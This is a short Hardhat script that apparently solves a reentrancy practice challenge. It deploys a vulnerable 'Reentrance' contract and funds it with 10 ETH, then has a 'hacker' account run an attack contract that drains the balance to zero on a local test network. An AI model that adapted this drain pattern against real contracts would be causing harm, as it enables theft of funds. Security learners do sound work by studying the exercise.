const hre = require("hardhat");

async function main() {
  const [ownerDeployer, hacker] = await hre.ethers.getSigners();
  const provider = hre.ethers.provider;


  const Reentrance = await hre.ethers.getContractFactory("Reentrance");
  const reentrance = await Reentrance.deploy();
  await reentrance.deployed();

  const Attack = await hre.ethers.getContractFactory("AttackReentrance");
  const attack = await Attack.deploy(reentrance.address);
  await attack.deployed();

  await reentrance.connect(ownerDeployer).donate(ownerDeployer.address, { value: hre.ethers.utils.parseEther("10") });

  await attack.connect(hacker).attack({value: hre.ethers.utils.parseEther("1")});

  console.log(await provider.getBalance(reentrance.address) == 0);
  
  await attack.attackAddress();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
